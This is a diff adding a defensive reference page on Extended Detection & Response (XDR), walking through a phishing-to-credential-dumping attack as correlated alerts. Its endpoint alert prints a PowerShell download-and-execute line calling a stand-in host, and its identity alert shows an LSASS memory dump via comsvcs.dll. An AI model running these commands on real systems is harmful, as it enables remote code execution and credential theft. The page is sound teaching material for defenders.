@@ -1,0 +1,494 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Extended Detection & Response (XDR) | SecArch Reference</title>
+  <meta name="description" content="Comprehensive guide to XDR - unified threat detection across endpoints, network, cloud, and email with automated response.">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&family=Space+Grotesk:wght@500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="main.css">
+</head>
+<body>
+  <header class="header">
+    <div class="header-content">
+      <a href="index.html" class="logo">
+        <div class="logo-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+        </div>
+        <span>SecArch Reference</span>
+      </a>
+      <div class="search-container">
+        <div class="search-box">
+          <svg class="search-icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
+          <input type="text" id="search-input" class="search-input" placeholder="Search documentation...">
+          <span class="search-shortcut">⌘K</span>
+          <div id="search-results" class="search-results"></div>
+        </div>
+      </div>
+      <button class="mobile-menu-btn" aria-label="Toggle menu">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg>
+      </button>
+    </div>
+  </header>
+
+  <div class="app-container">
+    <nav class="sidebar">
+      <div class="sidebar-section">
+        <div class="sidebar-section-title">Getting Started</div>
+        <ul class="sidebar-nav">
+          <li class="sidebar-nav-item"><a href="index.html" class="sidebar-nav-link">Overview</a></li>
+        </ul>
+      </div>
+      <div class="sidebar-section">
+        <div class="sidebar-section-title">5. Endpoint Security</div>
+        <ul class="sidebar-nav">
+          <li class="sidebar-nav-item"><a href="edr.html" class="sidebar-nav-link">AV Evolution</a></li>
+          <li class="sidebar-nav-item"><a href="edr.html" class="sidebar-nav-link">EDR</a></li>
+          <li class="sidebar-nav-item"><a href="xdr.html" class="sidebar-nav-link active">XDR</a></li>
+          <li class="sidebar-nav-item"><a href="mobile-security.html" class="sidebar-nav-link">MDM/UEM</a></li>
+          <li class="sidebar-nav-item"><a href="edr.html" class="sidebar-nav-link">Application Control</a></li>
+          <li class="sidebar-nav-item"><a href="conditional-access.html" class="sidebar-nav-link">Device Compliance</a></li>
+        </ul>
+      </div>
+      <div class="sidebar-section">
+        <div class="sidebar-section-title">Related</div>
+        <ul class="sidebar-nav">
+          <li class="sidebar-nav-item"><a href="siem.html" class="sidebar-nav-link">SIEM</a></li>
+          <li class="sidebar-nav-item"><a href="soar.html" class="sidebar-nav-link">SOAR</a></li>
+          <li class="sidebar-nav-item"><a href="ndr.html" class="sidebar-nav-link">NDR</a></li>
+        </ul>
+      </div>
+    </nav>
+
+    <main class="main-content">
+      <div class="content-wrapper">
+        <div class="page-header">
+          <div class="page-breadcrumb">
+            <a href="index.html">Home</a>
+            <span class="page-breadcrumb-separator">/</span>
+            <a href="edr.html">Endpoint Security</a>
+            <span class="page-breadcrumb-separator">/</span>
+            <span>XDR</span>
+          </div>
+          <h1>Extended Detection & Response (XDR)</h1>
+          <p class="page-description">XDR unifies security telemetry from endpoints, network, cloud, email, and identity into a single platform for correlated threat detection and automated response. It extends EDR capabilities across the entire attack surface, reducing alert fatigue and accelerating incident response.</p>
+        </div>
+
+        <section>
+          <h2 id="evolution">From EDR to XDR</h2>
+          
+          <div class="comparison-split">
+            <div class="comparison-box traditional">
+              <div class="comparison-box-header">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><line x1="15" y1="9" x2="9" y2="15"></line><line x1="9" y1="9" x2="15" y2="15"></line></svg>
+                Siloed Security Tools
+              </div>
+              <div class="comparison-box-content">
+                <ul>
+                  <li>EDR for endpoints only</li>
+                  <li>Separate NDR for network</li>
+                  <li>Different console for email security</li>
+                  <li>Cloud security in another tool</li>
+                  <li>SIEM aggregates logs but lacks context</li>
+                  <li>Manual correlation across tools</li>
+                  <li>Alert fatigue from multiple consoles</li>
+                </ul>
+                <div class="info-box danger" style="margin-top: var(--space-md);">
+                  <div class="info-box-content">
+                    <p style="margin: 0;"><strong>Problem:</strong> Attacker sends phishing email → user clicks → endpoint compromised → lateral movement via network. Each tool sees only its piece — no one sees the full attack chain.</p>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <div class="comparison-box modern">
+              <div class="comparison-box-header">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>
+                XDR: Unified Platform
+              </div>
+              <div class="comparison-box-content">
+                <ul>
+                  <li>Single platform for all telemetry</li>
+                  <li>Native integration across data sources</li>
+                  <li>Automatic correlation of related events</li>
+                  <li>Single incident from multiple alerts</li>
+                  <li>Complete attack visualization</li>
+                  <li>Unified response actions</li>
+                  <li>Reduced mean time to detect (MTTD)</li>
+                </ul>
+                <div class="info-box success" style="margin-top: var(--space-md);">
+                  <div class="info-box-content">
+                    <p style="margin: 0;"><strong>Result:</strong> XDR correlates email alert + endpoint alert + network alert into single incident: "Phishing attack → User jsmith → Cobalt Strike beacon → lateral movement attempt." Automated response isolates host in seconds.</p>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </section>
+
+        <section>
+          <h2 id="architecture">XDR Architecture</h2>
+          
+          <div class="diagram-container">
+            <svg viewBox="0 0 850 480" xmlns="http://www.w3.org/2000/svg">
+              <rect width="850" height="480" fill="#0f1117"/>
+              
+              <!-- Data Sources -->
+              <rect x="30" y="30" width="200" height="420" rx="8" fill="rgba(59, 130, 246, 0.05)" stroke="#3b82f6" stroke-dasharray="4"/>
+              <text x="130" y="55" text-anchor="middle" fill="#3b82f6" font-family="Space Grotesk, sans-serif" font-size="11" font-weight="600">TELEMETRY SOURCES</text>
+              
+              <rect x="50" y="75" width="160" height="45" rx="4" fill="#1e2430" stroke="#10b981"/>
+              <text x="130" y="95" text-anchor="middle" fill="#f1f5f9" font-family="IBM Plex Sans, sans-serif" font-size="10" font-weight="500">Endpoint</text>
+              <text x="130" y="112" text-anchor="middle" fill="#64748b" font-family="IBM Plex Sans, sans-serif" font-size="8">EDR Agent • Process • File • Registry</text>
+              
+              <rect x="50" y="135" width="160" height="45" rx="4" fill="#1e2430" stroke="#f59e0b"/>
+              <text x="130" y="155" text-anchor="middle" fill="#f1f5f9" font-family="IBM Plex Sans, sans-serif" font-size="10" font-weight="500">Network</text>
+              <text x="130" y="172" text-anchor="middle" fill="#64748b" font-family="IBM Plex Sans, sans-serif" font-size="8">NDR • Firewall • Proxy • DNS</text>
+              
+              <rect x="50" y="195" width="160" height="45" rx="4" fill="#1e2430" stroke="#8b5cf6"/>
+              <text x="130" y="215" text-anchor="middle" fill="#f1f5f9" font-family="IBM Plex Sans, sans-serif" font-size="10" font-weight="500">Email</text>
+              <text x="130" y="232" text-anchor="middle" fill="#64748b" font-family="IBM Plex Sans, sans-serif" font-size="8">Gateway • Phishing • Attachments</text>
+              
+              <rect x="50" y="255" width="160" height="45" rx="4" fill="#1e2430" stroke="#06b6d4"/>
+              <text x="130" y="275" text-anchor="middle" fill="#f1f5f9" font-family="IBM Plex Sans, sans-serif" font-size="10" font-weight="500">Cloud</text>
+              <text x="130" y="292" text-anchor="middle" fill="#64748b" font-family="IBM Plex Sans, sans-serif" font-size="8">AWS/Azure/GCP • SaaS • CASB</text>
+              
+              <rect x="50" y="315" width="160" height="45" rx="4" fill="#1e2430" stroke="#ec4899"/>
+              <text x="130" y="335" text-anchor="middle" fill="#f1f5f9" font-family="IBM Plex Sans, sans-serif" font-size="10" font-weight="500">Identity</text>
+              <text x="130" y="352" text-anchor="middle" fill="#64748b" font-family="IBM Plex Sans, sans-serif" font-size="8">AD • Entra • UEBA • PAM</text>
+              
+              <rect x="50" y="375" width="160" height="45" rx="4" fill="#1e2430" stroke="#ef4444"/>
+              <text x="130" y="395" text-anchor="middle" fill="#f1f5f9" font-family="IBM Plex Sans, sans-serif" font-size="10" font-weight="500">Third-Party</text>
+              <text x="130" y="412" text-anchor="middle" fill="#64748b" font-family="IBM Plex Sans, sans-serif" font-size="8">API Integrations • Threat Intel</text>
+              
+              <!-- XDR Platform -->
+              <rect x="280" y="50" width="340" height="380" rx="8" fill="rgba(16, 185, 129, 0.05)" stroke="#10b981" stroke-width="2"/>
+              <text x="450" y="80" text-anchor="middle" fill="#10b981" font-family="Space Grotesk, sans-serif" font-size="13" font-weight="600">XDR PLATFORM</text>
+              
+              <!-- Data Lake -->
+              <rect x="310" y="100" width="280" height="50" rx="6" fill="#1e2430" stroke="#3b82f6"/>
+              <text x="450" y="125" text-anchor="middle" fill="#f1f5f9" font-family="IBM Plex Sans, sans-serif" font-size="11" font-weight="500">Unified Data Lake</text>
+              <text x="450" y="142" text-anchor="middle" fill="#64748b" font-family="IBM Plex Sans, sans-serif" font-size="8">Normalized schema • 30-365 day retention • Petabyte scale</text>
+              
+              <!-- Correlation Engine -->
+              <rect x="310" y="165" width="135" height="70" rx="6" fill="#1e2430" stroke="#8b5cf6"/>
+              <text x="377" y="190" text-anchor="middle" fill="#f1f5f9" font-family="IBM Plex Sans, sans-serif" font-size="10" font-weight="500">Correlation Engine</text>
+              <text x="377" y="207" text-anchor="middle" fill="#64748b" font-family="IBM Plex Sans, sans-serif" font-size="8">Cross-domain rules</text>
+              <text x="377" y="222" text-anchor="middle" fill="#64748b" font-family="IBM Plex Sans, sans-serif" font-size="8">Attack chain detection</text>
+              
+              <!-- ML Engine -->
+              <rect x="455" y="165" width="135" height="70" rx="6" fill="#1e2430" stroke="#f59e0b"/>
+              <text x="522" y="190" text-anchor="middle" fill="#f1f5f9" font-family="IBM Plex Sans, sans-serif" font-size="10" font-weight="500">ML/AI Engine</text>
+              <text x="522" y="207" text-anchor="middle" fill="#64748b" font-family="IBM Plex Sans, sans-serif" font-size="8">Anomaly detection</text>
+              <text x="522" y="222" text-anchor="middle" fill="#64748b" font-family="IBM Plex Sans, sans-serif" font-size="8">Behavioral analytics</text>
+              
+              <!-- Incident Management -->
+              <rect x="310" y="250" width="280" height="60" rx="6" fill="#1e2430" stroke="#ef4444"/>
+              <text x="450" y="275" text-anchor="middle" fill="#f1f5f9" font-family="IBM Plex Sans, sans-serif" font-size="11" font-weight="500">Incident Management</text>
+              <text x="450" y="295" text-anchor="middle" fill="#64748b" font-family="IBM Plex Sans, sans-serif" font-size="9">Auto-merge related alerts • Attack story visualization • MITRE mapping</text>
+              
+              <!-- Response Actions -->
+              <rect x="310" y="325" width="280" height="90" rx="6" fill="#1e2430" stroke="#10b981"/>
+              <text x="450" y="350" text-anchor="middle" fill="#f1f5f9" font-family="IBM Plex Sans, sans-serif" font-size="11" font-weight="500">Automated Response</text>
+              
+              <rect x="325" y="365" width="75" height="35" rx="4" fill="#151921" stroke="#2a3142"/>
+              <text x="362" y="387" text-anchor="middle" fill="#94a3b8" font-family="IBM Plex Sans, sans-serif" font-size="8">Isolate Host</text>
+              
+              <rect x="410" y="365" width="75" height="35" rx="4" fill="#151921" stroke="#2a3142"/>
+              <text x="447" y="387" text-anchor="middle" fill="#94a3b8" font-family="IBM Plex Sans, sans-serif" font-size="8">Block Hash</text>
+              
+              <rect x="495" y="365" width="75" height="35" rx="4" fill="#151921" stroke="#2a3142"/>
+              <text x="532" y="387" text-anchor="middle" fill="#94a3b8" font-family="IBM Plex Sans, sans-serif" font-size="8">Disable User</text>
+              
+              <!-- Outputs -->
+              <rect x="670" y="100" width="150" height="330" rx="8" fill="rgba(139, 92, 246, 0.05)" stroke="#8b5cf6" stroke-dasharray="4"/>
+              <text x="745" y="125" text-anchor="middle" fill="#8b5cf6" font-family="Space Grotesk, sans-serif" font-size="10" font-weight="600">OUTCOMES</text>
+              
+              <rect x="685" y="150" width="120" height="35" rx="4" fill="#1e2430" stroke="#ef4444"/>
+              <text x="745" y="172" text-anchor="middle" fill="#f1f5f9" font-family="IBM Plex Sans, sans-serif" font-size="9">High-Fidelity Alerts</text>
+              
+              <rect x="685" y="200" width="120" height="35" rx="4" fill="#1e2430" stroke="#2a3142"/>
+              <text x="745" y="222" text-anchor="middle" fill="#f1f5f9" font-family="IBM Plex Sans, sans-serif" font-size="9">Attack Stories</text>
+              
+              <rect x="685" y="250" width="120" height="35" rx="4" fill="#1e2430" stroke="#2a3142"/>
+              <text x="745" y="272" text-anchor="middle" fill="#f1f5f9" font-family="IBM Plex Sans, sans-serif" font-size="9">Root Cause Analysis</text>
+              
+              <rect x="685" y="300" width="120" height="35" rx="4" fill="#1e2430" stroke="#2a3142"/>
+              <text x="745" y="322" text-anchor="middle" fill="#f1f5f9" font-family="IBM Plex Sans, sans-serif" font-size="9">Threat Hunting</text>
+              
+              <rect x="685" y="350" width="120" height="35" rx="4" fill="#1e2430" stroke="#2a3142"/>
+              <text x="745" y="372" text-anchor="middle" fill="#f1f5f9" font-family="IBM Plex Sans, sans-serif" font-size="9">Executive Reports</text>
+              
+              <!-- Arrows -->
+              <path d="M230 225 L280 225" stroke="#3b82f6" stroke-width="2" fill="none"/>
+              <path d="M620 225 L670 225" stroke="#10b981" stroke-width="2" fill="none"/>
+            </svg>
+          </div>
+        </section>
+
+        <section>
+          <h2 id="attack-flow">XDR Detection: Multi-Stage Attack Example</h2>
+          
+          <div class="flow-diagram">
+            <div class="flow-diagram-title">Correlated Attack Detection: Phishing → Malware → Lateral Movement</div>
+            
+            <div class="flow-vertical">
+              <div class="flow-vertical-step">
+                <div class="flow-step-number">1</div>
+                <div class="flow-step-content">
+                  <div class="flow-step-title">Email: Phishing Detected (T1566.001)</div>
+                  <div class="flow-step-description">XDR email sensor detects suspicious attachment delivered to user</div>
+                  <div class="code-block" style="margin-top: var(--space-md);">
+                    <div class="code-block-header"><span class="code-block-title">Email Alert</span></div>
+                    <pre><code>Source: Email Security
+Alert: Suspicious attachment delivered
+Severity: Medium
+
+Details:
+  Recipient: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="9af0e9f7f3eef2daf9f5f4eef5e9f5b4f9f5f7">[email&#160;protected]</a>
+  Subject: "Invoice #4521 - Urgent"
+  Sender: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="d7b6b4b4b8a2b9a3beb9b097b4e7b9a3b8a4b8f9b4b8ba">[email&#160;protected]</a> (typosquat)
+  Attachment: Invoice_4521.xlsm (macro-enabled)
+  
+Indicators:
+  - Sender domain registered 2 days ago
+  - Macro with obfuscated PowerShell
+  - Known phishing template
+  
+Alert ID: EMAIL-2024-8847</code></pre>
+                  </div>
+                </div>
+              </div>
+
+              <div class="flow-vertical-step warning">
+                <div class="flow-step-number">2</div>
+                <div class="flow-step-content">
+                  <div class="flow-step-title">Endpoint: Malicious Process (T1059.001)</div>
+                  <div class="flow-step-description">EDR detects Excel spawning PowerShell with encoded command — 2 minutes after email delivery</div>
+                  <div class="code-block" style="margin-top: var(--space-md);">
+                    <div class="code-block-header"><span class="code-block-title">Endpoint Alert</span></div>
+                    <pre><code>Source: EDR (Endpoint)
+Alert: Suspicious process chain
+Severity: High
+Host: WORKSTATION-JS01
+User: CONTOSO\jsmith
+
+Process Chain:
+  outlook.exe
+    └── EXCEL.EXE
+          └── powershell.exe -enc JABzAD0ATgBlAHcALQBP...
+
+Decoded Command:
+  IEX(New-Object Net.WebClient).DownloadString(
+    'https://evil.site/payload.ps1')
+
+MITRE: T1059.001 (PowerShell)
+Alert ID: EDR-2024-2291
+
+*** CORRELATION: Same user as EMAIL-2024-8847 ***</code></pre>
+                  </div>
+                </div>
+              </div>
+
+              <div class="flow-vertical-step warning">
+                <div class="flow-step-number">3</div>
+                <div class="flow-step-content">
+                  <div class="flow-step-title">Network: C2 Communication (T1071.001)</div>
+                  <div class="flow-step-description">NDR detects beaconing pattern to unknown external IP — same host</div>
+                  <div class="code-block" style="margin-top: var(--space-md);">
+                    <div class="code-block-header"><span class="code-block-title">Network Alert</span></div>
+                    <pre><code>Source: NDR (Network)
+Alert: Beaconing activity detected
+Severity: High
+
+Connection:
+  Source: 10.1.1.50 (WORKSTATION-JS01)
+  Destination: 185.234.72.19:443
+  Pattern: 60-second intervals (±5s jitter)
+  
+Traffic Analysis:
+  - JA3 fingerprint: Cobalt Strike signature
+  - Encrypted payload ~64KB per beacon
+  - Destination IP: Bulletproof hosting (Romania)
+
+MITRE: T1071.001 (Web Protocols)
+Alert ID: NDR-2024-0847
+
+*** CORRELATION: Same host as EDR-2024-2291 ***</code></pre>
+                  </div>
+                </div>
+              </div>
+
+              <div class="flow-vertical-step danger">
+                <div class="flow-step-number">4</div>
+                <div class="flow-step-content">
+                  <div class="flow-step-title">Identity: Credential Access Attempt (T1003)</div>
+                  <div class="flow-step-description">LSASS access detected from compromised host — credential dumping attempt</div>
+                  <div class="code-block" style="margin-top: var(--space-md);">
+                    <div class="code-block-header"><span class="code-block-title">Identity Alert</span></div>
+                    <pre><code>Source: EDR + Identity Protection
+Alert: Credential dumping attempt
+Severity: Critical
+
+Activity:
+  Host: WORKSTATION-JS01
+  Process: rundll32.exe (comsvcs.dll MiniDump)
+  Target: lsass.exe (PID 672)
+  
+Technique: LSASS memory dump
+MITRE: T1003.001 (LSASS Memory)
+Alert ID: EDR-2024-2293
+
+*** CORRELATION: Same attack chain ***</code></pre>
+                  </div>
+                </div>
+              </div>
+
+              <div class="flow-vertical-step success">
+                <div class="flow-step-number">5</div>
+                <div class="flow-step-content">
+                  <div class="flow-step-title">XDR: Correlated Incident + Automated Response</div>
+                  <div class="flow-step-description">XDR merges all alerts into single incident and triggers automated containment</div>
+                  <div class="code-block" style="margin-top: var(--space-md);">
+                    <div class="code-block-header"><span class="code-block-title">XDR Incident</span></div>
+                    <pre><code>═══════════════════════════════════════════════════════════
+  XDR INCIDENT: INC-2024-0127 - Active Attack Chain
+  Severity: CRITICAL
+  Status: Auto-Remediation In Progress
+═══════════════════════════════════════════════════════════
+
+Correlated Alerts (4):
+  1. EMAIL-2024-8847 - Phishing email delivered
+  2. EDR-2024-2291  - Macro → PowerShell execution
+  3. NDR-2024-0847  - C2 beaconing detected
+  4. EDR-2024-2293  - Credential dumping attempt
+
+Attack Chain (Auto-Generated):
+  [Phishing] → [Initial Access] → [Execution] → [C2] → [Cred Access]
+      ↓            ↓                  ↓          ↓          ↓
+   T1566.001    T1204.002        T1059.001   T1071.001  T1003.001
+
+Affected Assets:
+  - User: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="f8928b95918c90b89b97968c978b97d69b9795">[email&#160;protected]</a>
+  - Host: WORKSTATION-JS01 (10.1.1.50)
+  - Potential exposure: Domain credentials
+
+AUTOMATED RESPONSE ACTIONS:
+  ✓ Host isolated from network (10:32:15 UTC)
+  ✓ User session terminated (10:32:16 UTC)
+  ✓ Malicious hash blocked org-wide (10:32:18 UTC)
+  ✓ C2 IP blocked at firewall (10:32:19 UTC)
+  ✓ User password reset forced (10:32:22 UTC)
+  ✓ SOC ticket created (INC-2024-0127)
+  
+TIME TO DETECT: 4 minutes
+TIME TO CONTAIN: 7 seconds (automated)</code></pre>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </section>
+
+        <section>
+          <h2 id="vendors">XDR Vendor Comparison</h2>
+          
+          <div class="vendor-grid">
+            <div class="vendor-item">Microsoft Defender XDR</div>
+            <div class="vendor-item">Palo Alto Cortex XDR</div>
+            <div class="vendor-item">CrowdStrike Falcon</div>
+            <div class="vendor-item">SentinelOne Singularity</div>
+            <div class="vendor-item">Trend Micro Vision One</div>
+            <div class="vendor-item">Cisco XDR</div>
+            <div class="vendor-item">Trellix XDR</div>
+            <div class="vendor-item">Fortinet FortiXDR</div>
+          </div>
+
+          <div class="table-container">
+            <table>
+              <thead>
+                <tr>
+                  <th>Capability</th>
+                  <th>Microsoft Defender XDR</th>
+                  <th>Cortex XDR</th>
+                  <th>CrowdStrike</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td>Native Endpoint</td>
+                  <td class="check-yes">✓ MDE</td>
+                  <td class="check-yes">✓ Cortex</td>
+                  <td class="check-yes">✓ Falcon</td>
+                </tr>
+                <tr>
+                  <td>Native Network</td>
+                  <td class="check-partial">Via Defender for IoT</td>
+                  <td class="check-yes">✓ NGFW integration</td>
+                  <td class="check-partial">Via partners</td>
+                </tr>
+                <tr>
+                  <td>Native Email</td>
+                  <td class="check-yes">✓ Defender for O365</td>
+                  <td class="check-partial">3rd party</td>
+                  <td class="check-partial">3rd party</td>
+                </tr>
+                <tr>
+                  <td>Native Cloud</td>
+                  <td class="check-yes">✓ Defender for Cloud</td>
+                  <td class="check-yes">✓ Prisma Cloud</td>
+                  <td class="check-yes">✓ Cloud Security</td>
+                </tr>
+                <tr>
+                  <td>Native Identity</td>
+                  <td class="check-yes">✓ Entra ID Protection</td>
+                  <td class="check-partial">Via integrations</td>
+                  <td class="check-yes">✓ Falcon Identity</td>
+                </tr>
+                <tr>
+                  <td>SIEM Integration</td>
+                  <td class="check-yes">✓ Sentinel</td>
+                  <td class="check-yes">✓ XSIAM</td>
+                  <td class="check-yes">✓ LogScale</td>
+                </tr>
+                <tr>
+                  <td>Auto-Remediation</td>
+                  <td class="check-yes">✓</td>
+                  <td class="check-yes">✓</td>
+                  <td class="check-yes">✓</td>
+                </tr>
+                <tr>
+                  <td>Managed Option</td>
+                  <td class="check-yes">✓ Defender Experts</td>
+                  <td class="check-yes">✓ Unit 42 MDR</td>
+                  <td class="check-yes">✓ Falcon Complete</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+        </section>
+
+        <section>
+          <h2 id="best-practices">XDR Implementation Best Practices</h2>
+          
+          <div class="info-box success">
+            <div class="info-box-title">
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>
+              Success Factors
+            </div>
+            <div class="info-box-content">
+              <p><strong>1. Prioritize Native Integration:</strong> XDR works best when telemetry sources are from the same vendor. Native-to-native correlation is always deeper than API integrations.</p>
+              <p><strong>2. Start with Endpoint + Email:</strong> These two sources catch the majority of attacks. Add network and cloud as you mature.</p>
+              <p><strong>3. Enable Auto-Remediation Gradually:</strong> Start with detection-only, then enable automated response for high-confidence detections. Review all actions initially.</p>
+              <p><strong>4. Tune Correlation Rules:</strong> Out-of-box rules generate noise. Spend time tuning to your environment — whitelist known-good behaviors.</p>
+              <p><strong>5. Invest in Threat Hunting:</strong> XDR provides the data lake — use it. Schedule regular hunting exercises using the unified query interface.</p>
+              <p><strong>6. Don't Abandon SIEM:</strong> XDR handles detection/response; SIEM handles compliance, long-term retention, and non-security logs. They complement each other.</p>
+            </div>
+          </div>
+        </section>
+
+        <nav class="page-nav">
+          <a href="edr.html" class="page-nav-link prev">
+            <div class="page-nav-labe
